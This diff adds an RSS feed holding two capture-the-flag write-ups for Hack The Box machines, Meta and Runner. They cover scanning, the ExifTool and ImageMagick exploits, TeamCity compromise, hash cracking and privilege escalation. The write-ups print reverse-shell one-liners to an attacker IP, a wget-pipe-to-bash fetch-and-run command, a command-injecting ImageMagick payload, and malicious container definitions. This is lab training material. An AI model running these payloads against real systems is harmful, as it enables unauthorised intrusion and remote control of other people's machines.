@@ -1,0 +1,311 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+    <channel>
+        <title></title>
+        <link>undefined</link>
+        <description>undefined</description>
+        <lastBuildDate>Wed, 18 Sep 2024 22:23:24 GMT</lastBuildDate>
+        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
+        <generator>Joplin Pages Publisher</generator>
+        <item>
+            <title><![CDATA[Meta]]></title>
+            <guid>a3180ea6ec5d43a9894e3a9e9924b688</guid>
+            <pubDate>Sun, 18 Aug 2024 19:24:02 GMT</pubDate>
+            <content:encoded><![CDATA[<h1 id="recon">Recon</h1>
+<div><pre class="hljs"><code>└──╼ $sudo nmap -p- -A artcorp.htb
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-18 19:22 UTC
+Nmap scan report for artcorp.htb (10.129.178.202)
+Host is up (0.031s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
+|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
+|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
+80/tcp open  http    Apache httpd
+|_http-title: Home
+|_http-server-header: Apache
+Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 5900/tcp)
+HOP RTT      ADDRESS
+1   31.53 ms 10.10.14.1
+2   31.83 ms 10.129.178.202
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.70 seconds</code></pre></div>
+<div><pre class="hljs"><code>└──╼ $ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.artcorp.htb -fc 301 -t 100
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://FUZZ.artcorp.htb
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 100
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response status: 301
+________________________________________________
+
+dev01                   [Status: 200, Size: 247, Words: 16, Lines: 10, Duration: 3076ms]</code></pre></div>
+<div><pre class="hljs"><code>└──╼ $gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u artcorp.htb
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://artcorp.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/assets               (Status: 301) [Size: 234] [--&gt; http://artcorp.htb/assets/]
+/css                  (Status: 301) [Size: 231] [--&gt; http://artcorp.htb/css/]</code></pre></div>
+<p>Checking out the main site gives us not much of value. Links don’t go anywhere, so we have to focus on the interesting subdomain.</p>
+<p><img src="/_resources/252b9dae160c44b8a36135d6e499b945.png" /></p>
+<p>The subdomain:</p>
+<p><img src="/_resources/b7768414e8ed4664824c526d2ec6e457.png" /></p>
+<p>Link goes to:</p>
+<p><img src="/_resources/de6f1113fb8243bdb016c21b67ec647c.png" /></p>
+<h1 id="cve-2021-22204">CVE-2021-22204</h1>
+<p>If the site is analyzing metadata, then the first thought is exploiting metadata analyzer.</p>
+<p>The first resoult is: <a title="https://github.com/OneSecCyber/JPEG_RCE" href="https://github.com/OneSecCyber/JPEG_RCE">https://github.com/OneSecCyber/JPEG_RCE</a>, so why not give it a go.<br />
+Exploit works exactly as in POC, but for some reason reverse shell from it doesnt work.<br />
+Searching github for CVE-2021-22204 fortunetly gets us more options.</p>
+<p><img src="/_resources/944c1ffbd54f4f34a4866beca9efcf82.png" /></p>
+<p>And we are in.<br />
+For QoL, we can get shell stablisation.</p>
+<div><pre class="hljs"><code>python3 -c <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span>
+<span class="hljs-built_in">export</span> TERM=xterm
+CTRL-Z
+stty raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span></code></pre></div>
+<h1 id="user-access">User access</h1>
+<p>Running linenum returns nothing of value.<br />
+Running linpeas tells us to check for:</p>
+<ol>
+<li>
+<p>Sudo version 1.8.27</p>
+</li>
+<li>
+<p>[CVE-2019-13272] PTRACE_TRACEME</p>
+<p>Details: <a title="https://bugs.chromium.org/p/project-zero/issues/detail?id=1903" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1903">https://bugs.chromium.org/p/project-zero/issues/detail?id=1903</a><br />
+Exposure: highly probable<br />
+Tags: ubuntu=16.04{kernel:4.15.0-<em>},ubuntu=18.04{kernel:4.15.0-</em>},debian=9{kernel:4.9.0-<em>},[ debian=10{kernel:4.19.0-</em>} ],fedora=30{kernel:5.0.9-*}<br />
+Download URL: <a title="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47133.zip" href="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47133.zip">https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47133.zip</a><br />
+ext-url: <a title="https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c" href="https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c">https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c</a><br />
+Comments: Requires an active PolKit agent.</p>
+</li>
+<li>
+<p>lrwxrwxrwx 1 root root 35 Aug 29  2021 /etc/apache2/sites-enabled/artcorp.htb.conf -&gt; …/sites-available/artcorp.htb.conf</p>
+</li>
+</ol>
+<p>So checking:</p>
+<ol>
+<li>Seems to be vulnerable, but cant run it without user password.</li>
+<li>Doesnt seem to work on our machine.</li>
+<li>This file doesnt exist and we cant create it.</li>
+</ol>
+<p>Then we can run pspy to inspect what is going on the sysem.<br />
+It seems to run a few scripts on regular basis.</p>
+<p>2024/08/18 17:59:01 CMD: UID=1000  PID=4389   | /bin/bash /usr/local/bin/convert_images.sh<br />
+2024/08/18 18:00:01 CMD: UID=1000  PID=4405   | pkill mogrify</p>
+<div><pre class="hljs"><code>www-data@meta:/usr/local/bin$ mogrify --version
+Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org
+Copyright: © 1999-2020 ImageMagick Studio LLC
+License: https://imagemagick.org/script/license.php
+Features: Cipher DPC HDRI OpenMP(4.5) 
+Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib</code></pre></div>
+<p>Looking for “ImageMagick 7.0.10-36 CVE” gets us CVE-2020-29599.<br />
+<a title="https://nvd.nist.gov/vuln/detail/CVE-2020-29599" href="https://nvd.nist.gov/vuln/detail/CVE-2020-29599">https://nvd.nist.gov/vuln/detail/CVE-2020-29599</a><br />
+<a title="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html" href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html">https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html</a></p>
+<div><pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">authenticate</span>=<span class="hljs-string">'ff" `echo $(id)&gt; ./0wned`;"'</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">read</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">"pdf:/etc/passwd"</span>/&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">get</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"base-width"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"base-height"</span> /&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">resize</span> <span class="hljs-attr">geometry</span>=<span class="hljs-string">"400x400"</span> /&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">write</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">"test.png"</span> /&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"700"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"700"</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.w3.org/2000/svg"</span> <span class="hljs-attr">xmlns:xlink</span>=<span class="hljs-string">"http://www.w3.org/1999/xlink"</span>&gt;</span>       
+  <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">"msl:poc.svg"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"100"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"100"</span>/&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span></code></pre></div>
+<p>The POC did work, but it made me mad. Two things:</p>
+<ol>
+<li>The files in /var/www/dev01.artcorp.htb/convert_images are getting deleted every minute.</li>
+<li><code>&lt;image xlink:href="msl:poc.svg" height="100" width="100"/&gt;</code> line has to has to have name of the file in it, which I obviously missed.</li>
+<li>Making the script run <code>bash -i &gt;&amp; /dev/tcp/10.10.14.81/4444 0&gt;&amp;1</code></li>
+</ol>
+<p>I ended creating a sh script and running it with wget, after wasting way too much time here.</p>
+<div><pre class="hljs"><code><span class="hljs-meta">#!/bin/bash</span>
+bash -i &gt;&amp; /dev/tcp/10.10.14.81/4444 0&gt;&amp;1</code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-attribute">wget</span> -O - <span class="hljs-number">10.10.14.81</span>/shell.sh | bash</code></pre></div>
+<p>and changing the poc to:</p>
+<div><pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">authenticate</span>=<span class="hljs-string">'ff" `wget -O - 10.10.14.81/shell.sh | bash`;"'</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">read</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">"pdf:/etc/passwd"</span>/&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">get</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"base-width"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"base-height"</span> /&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">resize</span> <span class="hljs-attr">geometry</span>=<span class="hljs-string">"400x400"</span> /&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">write</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">"test.png"</span> /&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"700"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"700"</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.w3.org/2000/svg"</span> <span class="hljs-attr">xmlns:xlink</span>=<span class="hljs-string">$</span>
+  &lt;<span class="hljs-attr">image</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">"msl:poc.svg"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"100"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"100"</span>/&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span></code></pre></div>
+<p>Stabilize the shell and finally we can get the user flag for thomas.</p>
+<h1 id="priv-esc">Priv esc</h1>
+<p>Running linenum.sh gives us</p>
+<div><pre class="hljs"><code>[+] We can sudo without supplying a password!
+Matching Defaults entries for thomas on meta:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XDG_CONFIG_HOME
+
+User thomas may run the following commands on meta:
+    (root) NOPASSWD: /usr/bin/neofetch \"\"</code></pre></div>
+<p>Going to gtfobins gives us what we want.<br />
+<a title="https://gtfobins.github.io/gtfobins/neofetch/" href="https://gtfobins.github.io/gtfobins/neofetch/">https://gtfobins.github.io/gtfobins/neofetch/</a></p>
+<p>We cant run exactly that, as we cannot pass any arguments to neofetch.<br />
+Adding <code>exec /bin/sh</code> at the end of the ~/.config/neofetch did not seem to work.</p>
+<p>Looking again at <code>sudo -l</code> we can see that the only env value being kept is XDG_COFNIG_HOME. We can set it using <code>export XDG_CONFIG_HOME=/home/thomas/.config</code>. It works!</p>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Runner]]></title>
+            <guid>2229fdbd31f94a4da4528931f4f99c11</guid>
+            <pubDate>Wed, 14 Aug 2024 08:19:26 GMT</pubDate>
+            <content:encoded><![CDATA[<h1 id="recon">Recon</h1>
+<h2 id="nmap">nmap</h2>
+<div><pre class="hljs"><code><span class="hljs-variable">$nmap</span> -A runner.htb
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 08:18 UTC
+Nmap scan report <span class="hljs-keyword">for</span> runner.htb (10.129.182.43)
+Host is up (0.033s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp   open  http        nginx 1.18.0 (Ubuntu)
+|_http-title: Runner - CI/CD Specialists
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+8000/tcp open  nagios-nsca Nagios NSCA
+|_http-title: Site doesn<span class="hljs-string">'t have a title (text/plain; charset=utf-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre></div>
+<h2 id="dirbuster">dirbuster</h2>
+<p><img src="/_resources/e6674a3d868847c9b416ccc517809ba2.png" /></p>
+<h2 id="ffuf">ffuf</h2>
+<div><pre class="hljs"><code>ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u <span class="hljs-string">'http://FUZZ.runner.htb'</span> -<span class="hljs-built_in">fc</span> 302 -t 200</code></pre></div>
+<p>Does not give any resoults.</p>
+<h2 id="port-8000">port 8000</h2>
+<p>It hosts NSCA(Nagios Service Check Acceptor) Nagios addon.<br />
+<a title="https://answerhub.nagios.com/support/s/article/Using-the-NSCA-Addon-8b43111e" href="https://answerhub.nagios.com/support/s/article/Using-the-NSCA-Addon-8b43111e">https://answerhub.nagios.com/support/s/article/Using-the-NSCA-Addon-8b43111e</a><br />
+<a title="https://support.nagios.com/kb/article/nsca-overview-78.html" href="https://support.nagios.com/kb/article/nsca-overview-78.html">https://support.nagios.com/kb/article/nsca-overview-78.html</a></p>
+<p>It seems to be one of the products of system monitoring solutions firm.<br />
+<a title="https://www.nagios.com/products/" href="https://www.nagios.com/products/">https://www.nagios.com/products/</a></p>
+<p>It only recieves input from monitoring services and after further some research it seems like a dead end.</p>
+<h2 id="gobuster">gobuster</h2>
+<p>Running gobuster with larger n0kovo subdomains list in vhost enumeration mode finally gives us some resoults.</p>
+<div><pre class="hljs"><code><span class="hljs-variable">$gobuster</span> vhost -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://runner.htb  --append-domain -t 150
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://runner.htb
+[+] Method:          GET
+[+] Threads:         150
+[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt
+[+] User Agent:      gobuster/3.6
+[+] Timeout:         10s
+[+] Append Domain:   <span class="hljs-literal">true</span>
+===============================================================
+Starting gobuster <span class="hljs-keyword">in</span> VHOST enumeration mode
+===============================================================
+Found: teamcity.runner.htb Status: 401 [Size: 66]</code></pre></div>
+<h1 id="cve-2023-42793">CVE-2023-42793</h1>
+<p><a title="https://www.exploit-db.com/exploits/51884" href="https://www.exploit-db.com/exploits/51884">https://www.exploit-db.com/exploits/51884</a></p>
+<p><img src="/_resources/e54fcdeae2524f8792161809d787a524.png" /></p>
+<p>We are finally logged in somewhere.</p>
+<h1 id="teamcity">TeamCity</h1>
+<p>In team city, we can create a new project with build steps. Similarly to Jenkins, this can be used for getting reverse shell.</p>
+<p><img src="/_resources/46085b5b2402422c97e1abcb9f1a9472.png" /></p>
+<p>or that would be the case, if we couldnt just go to the admin panel and see all users including admin.</p>
+<p><img src="/_resources/d0d9a48fd91147a2bc446a7c5e65db85.png" /></p>
+<p>We can also get a backup of everything…</p>
+<p><img src="/_resources/50ba8c90574141069c6afe818a74a79d.png" /></p>
+<p>… and instead of searching in the gui, we can just find ssh keys.</p>
+<p><img src="/_resources/96c2146a19ad4bf895c7cbfb9e4e1f12.png" /></p>
+<p><code>ssh -i ./id_rsa john@runner.htb</code> allows us to log in as john and get the user flag.</p>
+<h1 id="priv-esc">Priv Esc</h1>
+<h2 id="linenum">LinEnum</h2>
+<p>LinEnum returns nothing as usually.</p>
+<h2 id="portainer">Portainer</h2>
+<div><pre class="hljs"><code>Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:5005          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8111          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:9443          0.0.0.0:*               LISTEN      -                   
+tcp        0     76 10.129.182.43:22        10.10.14.81:42262       ESTABLISHED -                   
+tcp        0      0 127.0.0.1:54050         127.0.0.1:9000          TIME_WAIT   -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::8000                 :::*                    LISTEN      - </code></pre></div>
+<div><pre class="hljs"><code>john@runner:/tmp$ ls /data
+bin  certs  chisel  compose  docker_config  portainer.db  portainer.key  portainer.pub  teamcity_server  tls</code></pre></div>
+<p>Using ssh tunneling <code>ssh -i ./id_rsa -L 8082:localhost:9000 john@runner.htb</code> , we can see that port 9000 is portainer, unfortunetly behind a password.</p>
+<p><img src="/_resources/e535ee9c4d9d4f1e84411c8c3da591c4.png" /></p>
+<p>Port 8111 is TeamCity.</p>
+<p><img src="/_resources/6043489f3b5c49e8bdc8f521ab5f1280.png" /></p>
+<p>In backup we can also find users file, hashed with bcrypt.</p>
+<div><pre class="hljs"><code>ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
+<span class="hljs-number">1</span>, admin, $2a$07$cQmbW7GA2NePss1vKY8RleSQ8kPMiU6av/N5m00mFHthv69NBBXOW, John, john<span class="hljs-symbol">@runner</span>.htb, <span class="hljs-number">1723627560076</span>, BCRYPT
+<span class="hljs-number">2</span>, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew<span class="hljs-symbol">@runner</span>.htb, <span class="hljs-number">1709150421438</span>, BCRYPT
+<span class="hljs-number">11</span>, city_adminq8dt, $2a$07$WJrTewhBjMRJGvEil6mxROo8RWeFimky0wPZt3pRvVgICHP61NlqG, , angry-admin<span class="hljs-symbol">@funnybunny</span>.org, <span class="hljs-number">1723628900193</span>, BCRYPT</code></pre></div>
+<p>Using john we get password for matthew, which is piper123.<br />
+We can use it to log into portainer.</p>
+<h3 id="yaml">yaml</h3>
+<p><img src="/_resources/28eeab3acf2e439ebb6ecb741ae210fe.png" /></p>
+<p>In custom templates, we can create our own reverse shell template:</p>
+<div><pre class="hljs"><code><span class="hljs-attr">version:</span> <span class="hljs-string">'3.8'</span>
+
+<span class="hljs-attr">services:</span>
+  <span class="hljs-attr">shell_reverse:</span>
+    <span class="hljs-attr">image:</span> <span class="hljs-string">alpine:latest</span>
+    <span class="hljs-attr">container_name:</span> <span class="hljs-string">shell_reverse</span>
+    <span class="hljs-attr">command:</span> <span class="hljs-string">sh</span> <span class="hljs-string">-c</span> <span class="hljs-string">"sh -i &gt;&amp; /dev/udp/10.10.14.81/4242 0&gt;&amp;1"</span>
+    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span></code></pre></div>
+<p>But then we learn that deploying the stack is reserved for admin users.</p>
+<h3 id="creating-dockerfile">Creating dockerfile</h3>
+<p>We can try to create a malicious docker file and upload it manualy.</p>
+<div><pre class="hljs"><code>mkdir shell_reverse
+<span class="hljs-built_in">cd</span> shell_reverse
+touch Dockerfile
+<span class="hljs-built_in">echo</span> <span class="hljs-string">'FROM alpine:latest'</span> &gt; Dockerfile
+<span class="hljs-built_in">echo</span> <span class="hljs-string">'CMD sh -c "sh -i &gt;&amp; /dev/udp/10.0.0.1/4242 0&gt;&amp;1"'</span> &gt; Dockerfile
+docker build -t shell_reverse .</code></pre></div>
+<p>But we cant deploy anything that is not from docker.io.</p>
+<h3 id="getting-flag-with-volume">Getting flag with volume</h3>
+<p>We have to create volume:</p>
+<p><img src="/_resources/c9c1997e95f541ed9f638408d816d338.png" /></p>
+<p>Then we have to attach it to a new container, for example teamcity.<br />
+After connecting as root to the container, we can see in /mnt the root flag.</p>
+<p><img src="/_resources/173419e77fb24f3ea93017505068db41.png" /></p>
+]]></content:encoded>
+        </item>
+    </channel>
+</rss>
